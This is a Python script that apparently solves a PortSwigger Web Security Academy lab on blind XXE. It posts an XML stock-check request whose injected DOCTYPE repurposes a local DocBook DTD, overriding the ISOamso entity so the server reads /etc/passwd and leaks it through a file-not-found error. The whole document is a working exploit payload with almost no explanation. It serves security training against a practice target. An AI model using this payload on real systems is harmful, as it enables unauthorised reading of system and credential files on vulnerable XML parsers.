# https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd

import requests
from rich.console import Console


console = Console()


SERVER="https://0af1005b03545d4dc0bf679f00f300e1.web-security-academy.net"
ENDPOINT="/product/stock"

def inject_xml(server, session):
    xml='''<?xml version="1.0" encoding="UTF-8"?>
    INJECT-HERE
    <stockCheck>
    <productId>
    1
    </productId>
    <storeId>
    1
    </storeId>
    </stockCheck>'''
    
    eval='''<!DOCTYPE message [
        <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
        <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>
        %local_dtd;
        ]>'''

    xml=xml.replace("INJECT-HERE", eval)
   
    response=session.post(f"{server}{ENDPOINT}", data=xml)

    console.log(f"Post status code {response.status_code}") 

    console.log(response.text)


def main(server=SERVER):
    session = requests.Session()
    inject_xml(server, session)

if __name__ == "__main__":
    main()
